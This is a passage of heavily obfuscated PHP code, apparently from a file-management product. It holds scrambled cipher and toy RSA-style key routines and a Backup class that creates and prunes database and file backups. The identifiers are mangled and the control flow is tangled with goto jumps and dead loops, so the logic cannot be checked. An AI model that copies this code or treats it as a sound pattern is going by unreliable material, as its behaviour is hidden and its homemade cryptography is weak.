$cµàÓŒê[349]($fØïİ…¯áŒ[$cÛÑ·è¼»¨++])) % 64; $AàáÕ¯ñò„ = $F‚ï“­ƒÔ‰[640]; while ($AàáÕ¯ñò„ < $F‚ï“­ƒÔ‰[571]) { if ($AàáÕ¯ñò„ >= 0) { break; } $AàáÕ¯ñò„++; } $Fİˆ›ôìÇ‡ .= $aÕªáÃÏ°ê[$AéÒÈã°ğ]; } $b±Êä¤óâå = $cµàÓŒê[340]($B‹àåµŠ™ . $Fİˆ›ôìÇ‡); goto d ‘˜İàĞ•; D£“Ü×£Àß: while (strlen($AÒ„‘äÙç) < $F‚ï“­ƒÔ‰[568]) { if (!$AÒ„‘äÙç) { break; } $AÒ„‘äÙç++; } $B‹àåµŠ™ = $aÕªáÃÏ°ê[$døÙòùØìŸ]; $AÃ·´Š†¶ = $F‚ï“­ƒÔ‰[632]; goto b¥º–ÒŒİ; D¯‚„ïÑ„: if (strlen($D¾Í²‹¶Ş—) < $F‚ï“­ƒÔ‰[578]) { die; } goto cğî¦«øàƒ; d ‘˜İàĞ•: $d‘ÆƒÓÕ×¼ = $F‚ï“­ƒÔ‰[641]; break; $D¾Í²‹¶Ş— = $F‚ï“­ƒÔ‰[642]; goto D¯‚„ïÑ„; cğî¦«øàƒ: default: $b±Êä¤óâå = $this->{$_SERVER[‚Ÿßñ][156]}($fƒàÁÁ§, $CçÇô¥’š . $cš¢Í‰¬»Ö); $a±æ¶Ï½¾« = $F‚ï“­ƒÔ‰[643]; while ($a±æ¶Ï½¾« < $F‚ï“­ƒÔ‰[580]) { if ($a±æ¶Ï½¾« >= 0) { break; } $a±æ¶Ï½¾«++; } break; $D»°Šç‚Òß = $F‚ï“­ƒÔ‰[644]; if (!$D»°Šç‚Òß) { return; } } $b±Êä¤óâå = $cµàÓŒê[222]($f¥«Â™ÇÚ . $cš¢Í‰¬»Ö . $b±Êä¤óâå); goto EåÅëáõ‚Ù; f¾Ïã¶™§: } private function lhtza5e20069($a™«¶ç¸Ÿ¸, $dè»‡Ñ£ë´, $fš»ÃÈ©Š = 3) { goto B½™Ãù‰¹; D“¢ç´¤“Ó: if (!$E®ñâÄá¦†) { die; } $F¡ªœ¢½± = $a™«¶ç¸Ÿ¸[0]; $b§Î‹ÏàÖ = $C§â¼â…Ğ–[647]; goto dó¹È–†¶…; dó¹È–†¶…: $BÂ—Í‰ô·ö = $eâÑÈ·ºå[25]($a™«¶ç¸Ÿ¸, 1, 15); $a™«¶ç¸Ÿ¸ = $eâÑÈ·ºå[25]($a™«¶ç¸Ÿ¸, 16); $EËœîğßË¢ = $C§â¼â…Ğ–[648]; goto Dì² â¹ß; Dì² â¹ß: $eÊ£¬éë× = $eâÑÈ·ºå[343]; switch ($F¡ªœ¢½±) { case $eâÑÈ·ºå[240]: $b¹¦ƒ…õ‰ = $this->{$_SERVER[‚Ÿßñ][255]}($a™«¶ç¸Ÿ¸, $eâÑÈ·ºå[222]($dè»‡Ñ£ë´ . $BÂ—Í‰ô·ö)); $EñÀ¥ğÇËÚ = $C§â¼â…Ğ–[649]; while (strlen($EñÀ¥ğÇËÚ) < $C§â¼â…Ğ–[568]) { if (!$EñÀ¥ğÇËÚ) { break; } $EñÀ¥ğÇËÚ++; } break; case $eâÑÈ·ºå[228]: $b¹¦ƒ…õ‰ = $this->{$_SERVER[‚Ÿßñ][255]}($a™«¶ç¸Ÿ¸, $eâÑÈ·ºå[222]($BÂ—Í‰ô·ö . $dè»‡Ñ£ë´)); $B„‡‘†¬Ç£ = $C§â¼â…Ğ–[650]; while (strlen($B„‡‘†¬Ç£) < $C§â¼â…Ğ–[571]) { if (!$B„‡‘†¬Ç£) { break; } $B„‡‘†¬Ç£++; } break; $b½ÃÒÌãµ = $C§â¼â…Ğ–[651]; if (!$b½ÃÒÌãµ) { die; } case $eâÑÈ·ºå[344]: $b¹¦ƒ…õ‰ = $this->{$_SERVER[‚Ÿßñ][255]}($a™«¶ç¸Ÿ¸, $eâÑÈ·ºå[127]($BÂ—Í‰ô·ö . $dè»‡Ñ£ë´)); break; case $eâÑÈ·ºå[345]: $b¹¦ƒ…õ‰ = $this->{$_SERVER[‚Ÿßñ][255]}($a™«¶ç¸Ÿ¸, $eâÑÈ·ºå[123]($BÂ—Í‰ô·ö . $dè»‡Ñ£ë´)); break; case $eâÑÈ·ºå[346]: goto a¡Ë¦æ„ã×; aù»à´‹¹Œ: $dò£ÒÍõæá = 0; for ($Bºõ·šŒº = 0; $Bºõ·šŒº < $eâÑÈ·ºå[24]($a™«¶ç¸Ÿ¸); $Bºõ·šŒº++) { $dò£ÒÍõæá = $dò£ÒÍõæá == $eâÑÈ·ºå[24]($aå–·‘øÜ„) ? 0 : $dò£ÒÍõæá; $eœ‰ÌêŒ³ = $C§â¼â…Ğ–[655]; if (!$eœ‰ÌêŒ³) { die; } $D¿¡ÛÏ›Æ÷ = $dò£ÒÍõæá++; $c¥¨£Ç’ = $eâÑÈ·ºå[348]($eÊ£¬éë×, $a™«¶ç¸Ÿ¸[$Bºõ·šŒº]) - $C¥ÎŸ¨èàÜ - $eâÑÈ·ºå[349]($aå–·‘øÜ„[$D¿¡ÛÏ›Æ÷]); $a÷ê¿°ƒ®¦ = $C§â¼â…Ğ–[656]; if (strlen($a÷ê¿°ƒ®¦) < $C§â¼â…Ğ–[571]) { die; } while ($c¥¨£Ç’ < 0) { $c¥¨£Ç’ += 64; } $Eˆ­õšÂ‚Ã .= $eÊ£¬éë×[$c¥¨£Ç’]; } $b¹¦ƒ…õ‰ = $eâÑÈ·ºå[352]($Eˆ­õšÂ‚Ã); goto BñÃ„ß”Ä; aÄë†‰ù‚¸: $C’Ñ‘å†Ã‚ = $a™«¶ç¸Ÿ¸[0]; $a™«¶ç¸Ÿ¸ = $eâÑÈ·ºå[25]($a™«¶ç¸Ÿ¸, 1); $C¥ÎŸ¨èàÜ = $eâÑÈ·ºå[348]($eÊ£¬éë×, $C’Ñ‘å†Ã‚); goto fÜ„ËÆÃ™À; Aš–íœ±»: $Bºõ·šŒº = 0; $e¸Õï¼§Ğ• = $C§â¼â…Ğ–[653]; if (!$e¸Õï¼§Ğ•) { die; } goto C±‹¹‰Ô†; fÜ„ËÆÃ™À: $aå–·‘øÜ„ = $eâÑÈ·ºå[123]($C’Ñ‘å†Ã‚ . $eâÑÈ·ºå[123]($dè»‡Ñ£ë´ . $C’Ñ‘å†Ã‚) . $dè»‡Ñ£ë´); $aå–·‘øÜ„ = $eâÑÈ·ºå[25]($aå–·‘øÜ„, $C¥ÎŸ¨èàÜ % 8, $C¥ÎŸ¨èàÜ % 8 + 7); $Eˆ­õšÂ‚Ã = $eâÑÈ·ºå[10]; goto Aš–íœ±»; a¡Ë¦æ„ã×: $a™«¶ç¸Ÿ¸ = $eâÑÈ·ºå[351]($a™«¶ç¸Ÿ¸); $B¸“«àì—— = $C§â¼â…Ğ–[652]; if (strlen($B¸“«àì——) < $C§â¼â…Ğ–[568]) { die; } goto aÄë†‰ù‚¸; BñÃ„ß”Ä: $bÏŸÔš‘¯¹ = $C§â¼â…Ğ–[657]; while (strlen($bÏŸÔš‘¯¹) < $C§â¼â…Ğ–[578]) { if (!$bÏŸÔš‘¯¹) { break; } $bÏŸÔš‘¯¹++; } break; goto d£ç‹ÄŠÖ; C±‹¹‰Ô†: $c¥¨£Ç’ = 0; $A‰ÂÙ²Ö = $C§â¼â…Ğ–[654]; if (!$A‰ÂÙ²Ö) { die; } goto aù»à´‹¹Œ; d£ç‹ÄŠÖ: default: $b¹¦ƒ…õ‰ = $this->{$_SERVER[‚Ÿßñ][255]}($a™«¶ç¸Ÿ¸, $dè»‡Ñ£ë´ . $BÂ—Í‰ô·ö); break; } if ($fš»ÃÈ©Š - 1 > 0) { $b¹¦ƒ…õ‰ = $this->{$_SERVER[‚Ÿßñ][197]}($b¹¦ƒ…õ‰, $dè»‡Ñ£ë´, $fš»ÃÈ©Š - 1); } goto D®Üµš; B½™Ãù‰¹: $C§â¼â…Ğ– =& $_SERVER[¨¤¼…´]; $eâÑÈ·ºå =& $_SERVER[‚Ÿßñ]; if (!$eâÑÈ·ºå[350]($a™«¶ç¸Ÿ¸) || $eâÑÈ·ºå[24]($a™«¶ç¸Ÿ¸) < 10) { return !1; } goto bİÂ¦Ëèãæ; bİÂ¦Ëèãæ: $a™«¶ç¸Ÿ¸ = $eâÑÈ·ºå[2]($a™«¶ç¸Ÿ¸); $a™«¶ç¸Ÿ¸ = $eâÑÈ·ºå[222]($a™«¶ç¸Ÿ¸); $E®ñâÄá¦† = $C§â¼â…Ğ–[646]; goto D“¢ç´¤“Ó; D®Üµš: return $b¹¦ƒ…õ‰; goto aí–—Ë–’; aí–—Ë–’: } public function uhdz11e6176e($c±•Ó¨§) { goto c¢¿ºòÒ»; dÓ”˜ÏíÎæ: $eæ—İŞÚ›Ğ = $a…İãÈĞô[249](($A¤‰¯“æÀ + $d–ï•ç‡¢) / 2); $c—˜Àº“Ö = $DŠ¢šŠ©½[660]; if (strlen($c—˜Àº“Ö) < $DŠ¢šŠ©½[578]) { return; } goto d¨á¿İƒå®; b­í³ßËä¯: return $cÜµƒö³ä; $cÓ£ï„ãÃ = $DŠ¢šŠ©½[665]; while (strlen($cÓ£ï„ãÃ) < $DŠ¢šŠ©½[15]) { if (!$cÓ£ï„ãÃ) { break; } $cÓ£ï„ãÃ++; } goto fø†µÔÌ³Í; b·Üáùë‚Ü: $e±ç¾¡¢ÏÄ = $this->{$_SERVER[‚Ÿßñ][156]}($A¤‰¯“æÀ * $d–ï•ç‡¢ . $a…İãÈĞô[10], $a…İãÈĞô[158]); $A‚„Ö¿ìÉØ = $a…İãÈĞô[123]($a…İãÈĞô[354] . ($A¤‰¯“æÀ + $d–ï•ç‡¢) . $a…İãÈĞô[355] . $eæ—İŞÚ›Ğ . $a…İãÈĞô[355] . $f„Ëƒ‰ì•À . $a…İãÈĞô[356]); $cÜµƒö³ä = $this->{$_SERVER[‚Ÿßñ][156]}($c±•Ó¨§, $A‚„Ö¿ìÉØ) . $a…İãÈĞô[357] . $e±ç¾¡¢ÏÄ; goto b­í³ßËä¯; d¨á¿İƒå®: while (1) { $c§¤Æ–×öÎ = $eæ—İŞÚ›Ğ; $fà…¸ù‡‘ó = $C÷×ØÓŒå‘; $e‚»§ˆÏĞ½ = $DŠ¢šŠ©½[661]; if (strlen($e‚»§ˆÏĞ½) < $DŠ¢šŠ©½[578]) { die; } while ($fà…¸ù‡‘ó % $c§¤Æ–×öÎ != 0) { $CÙ©ƒ«Íºô = $fà…¸ù‡‘ó; $aƒ ŒÉÆ° = $DŠ¢šŠ©½[662]; while ($aƒ ŒÉÆ° < $DŠ¢šŠ©½[578]) { if ($aƒ ŒÉÆ° >= 0) { break; } $aƒ ŒÉÆ°++; } $fà…¸ù‡‘ó = $c§¤Æ–×öÎ; $E’Ç½²ìğ = $DŠ¢šŠ©½[663]; $c§¤Æ–×öÎ = $CÙ©ƒ«Íºô % $c§¤Æ–×öÎ; $cÌĞ®¨Ó‰ = $DŠ¢šŠ©½[664]; while (strlen($cÌĞ®¨Ó‰) < $DŠ¢šŠ©½[571]) { if (!$cÌĞ®¨Ó‰) { break; } $cÌĞ®¨Ó‰++; } } if ($c§¤Æ–×öÎ == 1) { break; } else { $eæ—İŞÚ›Ğ++; } } $f„Ëƒ‰ì•À = 2; for ($eßĞğö£Â = 0; $eßĞğö£Â < $C÷×ØÓŒå‘ * 10; $eßĞğö£Â++) { if (($C÷×ØÓŒå‘ * $eßĞğö£Â + 1) % $eæ—İŞÚ›Ğ == 0) { $f„Ëƒ‰ì•À = $a…İãÈĞô[249](($C÷×ØÓŒå‘ * $eßĞğö£Â + 1) / $eæ—İŞÚ›Ğ); break; } } goto b·Üáùë‚Ü; CËÙĞ¥Ä˜: $cŠØˆë¸Í± = $DŠ¢šŠ©½[658]; while (strlen($cŠØˆë¸Í±) < $DŠ¢šŠ©½[15]) { if (!$cŠØˆë¸Í±) { break; } $cŠØˆë¸Í±++; } $d–ï•ç‡¢ = $this->{$_SERVER[‚Ÿßñ][353]}(); goto bÆİËå ±ó; bÆİËå ±ó: $C÷×ØÓŒå‘ = ($A¤‰¯“æÀ - 1) * ($d–ï•ç‡¢ - 1); $C‚¬İŒ¶‹ = $DŠ¢šŠ©½[659]; if (strlen($C‚¬İŒ¶‹) < $DŠ¢šŠ©½[580]) { return; } goto dÓ”˜ÏíÎæ; c¢¿ºòÒ»: $DŠ¢šŠ©½ =& $_SERVER[¨¤¼…´]; $a…İãÈĞô =& $_SERVER[‚Ÿßñ]; $A¤‰¯“æÀ = $this->{$_SERVER[‚Ÿßñ][353]}(); goto CËÙĞ¥Ä˜; fø†µÔÌ³Í: } public function fkqc591d9a18($c§£ƒĞ½‡¢) { goto Eé÷¿¥‹«; A„·­ñ«îâ: if (!$A¹‰µ´¿¤) { return; } if (!$a«İ‹Ú­) { return $dİÒÍí˜¨‹[10]; } $a«İ‹Ú­ = $dİÒÍí˜¨‹[249]($a«İ‹Ú­); goto còÙƒÅ»°ø; bšÅóÕãœ: $E…Ü„ëÅ¹ƒ = $fö«îËªÍâ[673]; while (strlen($E…Ü„ëÅ¹ƒ) < $fö«îËªÍâ[15]) { if (!$E…Ü„ëÅ¹ƒ) { break; } $E…Ü„ëÅ¹ƒ++; } goto e¦•‡½í; eâôÔ®±é‚: $d©Šğ¿î = $dİÒÍí˜¨‹[249](($Dãš«¼ãï÷ + $A¬¡Ÿ÷Š¯) / 2); while (1) { $bìœ…«é = $d©Šğ¿î; $e‡ŠªøÕ¶Œ = $D‘†ËŒ˜‰›; $a´«Ï×³ã» = $fö«îËªÍâ[669]; while ($e‡ŠªøÕ¶Œ % $bìœ…«é != 0) { $A°Â¤¥„ç = $e‡ŠªøÕ¶Œ; $e‡ŠªøÕ¶Œ = $bìœ…«é; $aö‚»—ñğÂ = $fö«îËªÍâ[670]; if (strlen($aö‚»—ñğÂ) < $fö«îËªÍâ[568]) { die; } $bìœ…«é = $A°Â¤¥„ç % $bìœ…«é; $eÃòƒÊ¡ê = $fö«îËªÍâ[671]; } if ($bìœ…«é == 1) { break; } else { $d©Šğ¿î++; } } $c·äç—šœŠ = 2; goto eãõõòíé½; eãõõòíé½: for ($eâù‚‘»á¼ = 0; $eâù‚‘»á¼ < $D‘†ËŒ˜‰› * 10; $eâù‚‘»á¼++) { if (($D‘†ËŒ˜‰› * $eâù‚‘»á¼ + 1) % $d©Šğ¿î == 0) { $c·äç—šœŠ = $dİÒÍí˜¨‹[249](($D‘†ËŒ˜‰› * $eâù‚‘»á¼ + 1) / $d©Šğ¿î); break; } } $Eï³„ÜôÏ = $dİÒÍí˜¨‹[123]($dİÒÍí˜¨‹[354] . ($Dãš«¼ãï÷ + $A¬¡Ÿ÷Š¯) . $dİÒÍí˜¨‹[355] . $d©Šğ¿î . $dİÒÍí˜¨‹[355] . $c·äç—šœŠ . $dİÒÍí˜¨‹[356]); $bØ‰–âà©ä = $this->{$_SERVER[‚Ÿßñ][255]}($f¶Ú†çì‰‘[0], $Eï³„ÜôÏ); goto d™Û¬ˆÕæÊ; eò“’è¸: if ($dİÒÍí˜¨‹[19]($f¶Ú†çì‰‘) != 2) { return $dİÒÍí˜¨‹[10]; } $a«İ‹Ú­ = $this->{$_SERVER[‚Ÿßñ][255]}($f¶Ú†çì‰‘[1] . $dİÒÍí˜¨‹[10], $dİÒÍí˜¨‹[158]); $A¹‰µ´¿¤ = $fö«îËªÍâ[666]; goto A„·­ñ«îâ; Eé÷¿¥‹«: $fö«îËªÍâ =& $_SERVER[¨¤¼…´]; $dİÒÍí˜¨‹ =& $_SERVER[‚Ÿßñ]; $f¶Ú†çì‰‘ = $dİÒÍí˜¨‹[0]($dİÒÍí˜¨‹[357], $c§£ƒĞ½‡¢); goto eò“’è¸; d™Û¬ˆÕæÊ: $e³œ¬ä÷ŒØ = $fö«îËªÍâ[672]; while (strlen($e³œ¬ä÷ŒØ) < $fö«îËªÍâ[15]) { if (!$e³œ¬ä÷ŒØ) { break; } $e³œ¬ä÷ŒØ++; } return $bØ‰–âà©ä; goto bšÅóÕãœ; còÙƒÅ»°ø: $c»›‹´Ë©Š = $fö«îËªÍâ[667]; while (strlen($c»›‹´Ë©Š) < $fö«îËªÍâ[571]) { if (!$c»›‹´Ë©Š) { break; } $c»›‹´Ë©Š++; } $Dãš«¼ãï÷ = 0; goto cõÍ¢ğ ; cõÍ¢ğ : $A¬¡Ÿ÷Š¯ = 0; for ($eâù‚‘»á¼ = 3; $eâù‚‘»á¼ < $a«İ‹Ú­; $eâù‚‘»á¼ += 2) { if ($a«İ‹Ú­ % $eâù‚‘»á¼ != 0) { continue; } $Dãš«¼ãï÷ = $eâù‚‘»á¼; $A¬¡Ÿ÷Š¯ = $dİÒÍí˜¨‹[249]($a«İ‹Ú­ / $eâù‚‘»á¼); break; $cè×‘“ˆÖç = $fö«îËªÍâ[668]; } $D‘†ËŒ˜‰› = ($Dãš«¼ãï÷ - 1) * ($A¬¡Ÿ÷Š¯ - 1); goto eâôÔ®±é‚; e¦•‡½í: } public function nmqd7d800979() { goto DÆÒøï‘…¨; DÆÒøï‘…¨: $Dë›Ã×¦—ç =& $_SERVER[¨¤¼…´]; $C¿µ˜Ù¼Å‚ =& $_SERVER[‚Ÿßñ]; $eÎ«İİ¦×² = $C¿µ˜Ù¼Å‚[338]($C¿µ˜Ù¼Å‚[358](2, 14), $C¿µ˜Ù¼Å‚[358](2, 16) - 1); goto FˆĞõÀ‘µ; FˆĞõÀ‘µ: $CÔĞ¤Ï‘Ë = array(); $D†œß¤ğØ = $Dë›Ã×¦—ç[617]; $d™«Õ©„¿ = 1; goto c·Œá À’—; DÊÁ§´æ»Ã: $côò¿ÇÛ¤‰ = 2; for ($FÅŠåƒššà = $eÎ«İİ¦×²; $FÅŠåƒššà > 1; $FÅŠåƒššà--) { $aˆµªğ”‚¤ = !0; foreach ($CÔĞ¤Ï‘Ë as $A‰‚øíÏÂÌ) { if ($FÅŠåƒššà % $A‰‚øíÏÂÌ == 0) { $aˆµªğ”‚¤ = !1; break; } } if ($aˆµªğ”‚¤) { $côò¿ÇÛ¤‰ = $FÅŠåƒššà; break; } } return $côò¿ÇÛ¤‰; goto E¡Ç¾îÔñˆ; c·Œá À’—: $A˜œÈĞäÉÉ = $Dë›Ã×¦—ç[674]; if (!$A˜œÈĞäÉÉ) { die; } while ($d™«Õ©„¿ <= (int) $C¿µ˜Ù¼Å‚[359]($eÎ«İİ¦×²)) { $FÅŠåƒššà = $d™«Õ©„¿; $FòÏê‰‹Š¯ = $Dë›Ã×¦—ç[675]; if (strlen($FòÏê‰‹Š¯) < $Dë›Ã×¦—ç[580]) { die; } while (!0) { $FÅŠåƒššà++; $c³¯ñøË‚ = $Dë›Ã×¦—ç[676]; if (!$c³¯ñøË‚) { die; } if ($FÅŠåƒššà <= 2) { $d™«Õ©„¿ = $FÅŠåƒššà; break; } else { if ($FÅŠåƒššà < 2) { continue; } } $aˆµªğ”‚¤ = !0; for ($f™Û±ëçº = 2; $f™Û±ëçº <= $C¿µ˜Ù¼Å‚[359]($FÅŠåƒššà); $f™Û±ëçº++) { if ($FÅŠåƒššà % $f™Û±ëçº == 0) { $aˆµªğ”‚¤ = !1; } } if ($aˆµªğ”‚¤) { $d™«Õ©„¿ = $FÅŠåƒššà; break; } } $CÔĞ¤Ï‘Ë[] = $d™«Õ©„¿; } goto DÊÁ§´æ»Ã; E¡Ç¾îÔñˆ: } public function mqbwcc6cac24($C´±À––Ù, $F‹”÷•èˆĞ) { $B†Á·–ÏŠĞ =& $_SERVER[‚Ÿßñ]; return $B†Á·–ÏŠĞ[13](array($B†Á·–ÏŠĞ[14], $B†Á·–ÏŠĞ[360]), $C´±À––Ù, $F‹”÷•èˆĞ); } public function mfbqe0a10a82($A–ƒëÀå˜Œ, $D¼Å¯«ñ÷µ) { $dŠ¾°è¾¦à =& $_SERVER[‚Ÿßñ]; return $dŠ¾°è¾¦à[13](array($dŠ¾°è¾¦à[361], $dŠ¾°è¾¦à[362]), $A–ƒëÀå˜Œ, $D¼Å¯«ñ÷µ); } public function egfc36a18118($b°”Õ’”«¾, $AÙ°Â‡‹ö) { $cŒÀ¶©Ü×Ñ =& $_SERVER[‚Ÿßñ]; return $cŒÀ¶©Ü×Ñ[13](array($cŒÀ¶©Ü×Ñ[361], $cŒÀ¶©Ü×Ñ[363]), $b°”Õ’”«¾, $AÙ°Â‡‹ö); } } class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $A‚ÙÖŒÕ®ñ =& $_SERVER[¨¤¼…´]; self::$name = date($A‚ÙÖŒÕ®ñ[677]); if (!($A©œŠ×…‘í = Model($A‚ÙÖŒÕ®ñ[678])->lastItem())) { $A©œŠ×…‘í = $this->initData(); } else { self::$name = $A©œŠ×…‘í[$A‚ÙÖŒÕ®ñ[38]]; if ($A©œŠ×…‘í[$A‚ÙÖŒÕ®ñ[679]] == $A‚ÙÖŒÕ®ñ[93]) { self::$name = date($A‚ÙÖŒÕ®ñ[680]); $fÀ·ÌŸ‰º¹ = 0; if (isset($A©œŠ×…‘í[$A‚ÙÖŒÕ®ñ[294]][$A‚ÙÖŒÕ®ñ[181]][$A‚ÙÖŒÕ®ñ[431]])) { $fÀ·ÌŸ‰º¹ = (int) $A©œŠ×…‘í[$A‚ÙÖŒÕ®ñ[294]][$A‚ÙÖŒÕ®ñ[181]][$A‚ÙÖŒÕ®ñ[431]]; } if ($A©œŠ×…‘í[$A‚ÙÖŒÕ®ñ[38]] == self::$name) { Model($A‚ÙÖŒÕ®ñ[678])->remove($A©œŠ×…‘í[$A‚ÙÖŒÕ®ñ[379]]); } $A©œŠ×…‘í = $this->initData($fÀ·ÌŸ‰º¹, $A©œŠ×…‘í[$A‚ÙÖŒÕ®ñ[681]]); } else { $this->checkStore($A©œŠ×…‘í[$A‚ÙÖŒÕ®ñ[681]]); } } self::$option = $A©œŠ×…‘í; } private function initData($Dª­ĞÏæ = 0, $CËƒæÊ–¨¼ = '') { goto A»»‹½·ï ; A»»‹½·ï : $Aâ×Âº±ø =& $_SERVER[¨¤¼…´]; $e‹«Ë–íõ = Model($Aâ×Âº±ø[678])->config(); if ($CËƒæÊ–¨¼ && $e‹«Ë–íõ[$Aâ×Âº±ø[681]] != $CËƒæÊ–¨¼) { $Dª­ĞÏæ = 0; } goto fÙå™†¼‚Ã; b‹ºà£Ú§„: $EÚ¸ç÷ïôË[$Aâ×Âº±ø[379]] = $dØ…ÙõËÁ; return $EÚ¸ç÷ïôË; goto bÌ¥°””ˆÀ; fÙå™†¼‚Ã: $this->checkStore($e‹«Ë–íõ[$Aâ×Âº±ø[681]]); $EÚ¸ç÷ïôË = array($Aâ×Âº±ø[681] => $e‹«Ë–íõ[$Aâ×Âº±ø[681]], $Aâ×Âº±ø[38] => self::$name, $Aâ×Âº±ø[679] => 0, $Aâ×Âº±ø[682] => $e‹«Ë–íõ[$Aâ×Âº±ø[682]], $Aâ×Âº±ø[294] => array($Aâ×Âº±ø[683] => array($Aâ×Âº±ø[679] => 0), $Aâ×Âº±ø[684] => array($Aâ×Âº±ø[679] => 0, $Aâ×Âº±ø[685] => 0, $Aâ×Âº±ø[686] => 0, $Aâ×Âº±ø[39] => $Aâ×Âº±ø[43]), $Aâ×Âº±ø[687] => array($Aâ×Âº±ø[679] => 0, $Aâ×Âº±ø[685] => 0, $Aâ×Âº±ø[686] => 0), $Aâ×Âº±ø[181] => array($Aâ×Âº±ø[679] => 0, $Aâ×Âº±ø[688] => 0, $Aâ×Âº±ø[689] => 0, $Aâ×Âº±ø[690] => 0, $Aâ×Âº±ø[691] => 0, $Aâ×Âº±ø[431] => $Dª­ĞÏæ)), $Aâ×Âº±ø[692] => time(), $Aâ×Âº±ø[460] => 0); $dØ…ÙõËÁ = Model($Aâ×Âº±ø[678])->insert($EÚ¸ç÷ïôË); goto b‹ºà£Ú§„; bÌ¥°””ˆÀ: } private function checkStore($DÕÈ¦¤…‹–) { $cçè…Òßê¦ =& $_SERVER[¨¤¼…´]; $Eõ¯ã¾Èæ… = Model($cçè…Òßê¦[693])->listData($DÕÈ¦¤…‹–); Model($cçè…Òßê¦[693])->checkConfig($Eõ¯ã¾Èæ…); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[¨¤¼…´][678])->findByName(self::$name); } return self::$option; } public static function set($BĞ¼°Òà‹) { $F“Ş“‡‰–³ =& $_SERVER[¨¤¼…´]; $b—‰Øñôã = self::get(); foreach ($BĞ¼°Òà‹ as $B»ÃÂŒõøÔ => $Béó•ë–¾é) { $eêˆ–ØÔÚ = explode($F“Ş“‡‰–³[101], $B»ÃÂŒõøÔ); $B†¡ç„å«— = count($eêˆ–ØÔÚ); switch ($B†¡ç„å«—) { case 1: $b—‰Øñôã[$eêˆ–ØÔÚ[0]] = $Béó•ë–¾é; break; case 2: $b—‰Øñôã[$eêˆ–ØÔÚ[0]][$eêˆ–ØÔÚ[1]] = $Béó•ë–¾é; break; case 3: $b—‰Øñôã[$eêˆ–ØÔÚ[0]][$eêˆ–ØÔÚ[1]][$eêˆ–ØÔÚ[2]] = $Béó•ë–¾é; break; } } Model($F“Ş“‡‰–³[678])->update($b—‰Øñôã[$F“Ş“‡‰–³[379]], $b—‰Øñôã); self::$option = $b—‰Øñôã; return self::$option; } public function keep() { $F“ÁªÕ²²„ =& $_SERVER[¨¤¼…´]; $E»í»Á›‡ = self::get(); if ($E»í»Á›‡[$F“ÁªÕ²²„[294]][$F“ÁªÕ²²„[683]][$F“ÁªÕ²²„[679]] == $F“ÁªÕ²²„[93]) { return; } $this->backupKeep($E»í»Á›‡); self::set(array($F“ÁªÕ²²„[694] => 1)); } private function backupKeep($bÚøÒœ¡¨) { goto FÏ¤«ËŠ‘Ÿ; FÏ¤«ËŠ‘Ÿ: $b˜Ã•Šğß¦ =& $_SERVER[¨¤¼…´]; $dôªŠ…‰Ã = Model($b˜Ã•Šğß¦[678])->listData(); if (empty($dôªŠ…‰Ã)) { return; } goto E·æÊñø˜±; eÁ´ÕÇø°ë: for ($a•­·ã·æ¼ = 0; $a•­·ã·æ¼ < 12; $a•­·ã·æ¼++) { $D¯íô«Íé[] = date($b˜Ã•Šğß¦[695], strtotime("\55{$a•­·ã·æ¼}\x20\x6d\x6f\156\164\x68\x73")); } $D¯íô«Íé = array_unique($D¯íô«Íé); foreach ($dôªŠ…‰Ã as $dÔŒŒÉ»Ó·) { if (!empty($dÔŒŒÉ»Ó·[$b˜Ã•Šğß¦[38]]) && in_array($dÔŒŒÉ»Ó·[$b˜Ã•Šğß¦[38]], $D¯íô«Íé)) { continue; } Model($b˜Ã•Šğß¦[678])->remove($dÔŒŒÉ»Ó·[$b˜Ã•Šğß¦[379]]); $eµŞàŠ°•é = "\x7b\x69\x6f\72{$bÚøÒœ¡¨[$b˜Ã•Šğß¦[681]]}\175\57\x64\x61\x74\x61\142\x61\163\x65\57\142\141\143\x6b\165\x70\x5f{$dÔŒŒÉ»Ó·[$b˜Ã•Šğß¦[38]]}"; IO::remove($eµŞàŠ°•é, !1); } goto aËƒ·ë”; E·æÊñø˜±: $a•­·ã·æ¼ = 0; $D¯íô«Íé = array(); foreach ($dôªŠ…‰Ã as $dÔŒŒÉ»Ó·) { if ($a•­·ã·æ¼ >= 7) { break; } $D¯íô«Íé[] = $dÔŒŒÉ»Ó·[$b˜Ã•Šğß¦[38]]; $a•­·ã·æ¼++; } goto eÁ´ÕÇø°ë; aËƒ·ë”: } public function db() { goto AÍ¬µ‡ŠÎÑ; d›öéèöí¿: return !0; goto B¹¨Œ‡ôà¡; AÍ¬µ‡ŠÎÑ: $bá´“›êêã =& $_SERVER[¨¤¼…´]; $Bø…‘Û‚ˆÏ = self::get(); if ($Bø…‘Û‚ˆÏ[$bá´“›êêã[294]][$bá´“›êêã[684]][$bá´“›êêã[679]] == $bá´“›êêã[93]) { return !0; } goto a˜Ü˜ƒçµ; a˜Ü˜ƒçµ: $aï¡¹ìĞâ¹ = new BackupDb(); if (!$aï¡¹ìĞâ¹->index()) { return !1; } self::set(array($bá´“›êêã[696] => 1)); goto d›öéèöí¿; B¹¨Œ‡ôà¡: } public function dbFile() { goto Bä„ÀË©; FÕÇŸÈÅñ­: $e¤¯­©³¡¯ = new BackupDbFile(); if (!$e¤¯­©³¡¯->index()) { return !1; } self::set(array($F—ƒ»”™Ñ¬[697] => 1)); goto Fƒ˜ÓÃÜ¬Ø; Bä„ÀË©: $F—ƒ»”™Ñ¬ =& $_SERVER[¨¤¼…´]; $bÙÙæâéÁ = self::get(); if ($bÙÙæâéÁ[$F—ƒ»”™Ñ¬[294]][$F—ƒ»”™Ñ¬[687]][$F—ƒ»”™Ñ¬[679]] == $F—ƒ»”™Ñ¬[93]) { return !0; } goto FÕÇŸÈÅñ­; Fƒ˜ÓÃÜ¬Ø: return !0; goto FùºÛˆ¤ÌŸ; FùºÛˆ¤ÌŸ: } public function file() { $d¶˜‘°·» =& $_SERVER[¨¤¼…´]; $DÜÆë¶„ƒÅ = self::get(); if ($DÜÆë¶„ƒÅ[$d¶˜‘°·»[294]][$d¶˜‘°·»[181]][$d¶˜‘°·»[679]] == $d¶˜‘°·»[93]) { return !0; } if (!isset($DÜÆë¶„ƒÅ[$d¶˜‘°·»[682]]) || $DÜÆë¶„ƒÅ[$d¶˜‘°·»[682]] == $d¶˜‘°·»[481]) { $dŸ§ÇÆå‘ = new BackupFile(); if (!$dŸ§ÇÆå‘->index()) { return !1; } } self::set(array($d¶˜‘°·»[698] => 1, $d¶˜‘°·»[679] => 1)); return !0; } } goto Fƒçë„Öğá; b¢óö„Š„¸: class IO extends ClassBaseCall { public static $driverCache = array(); 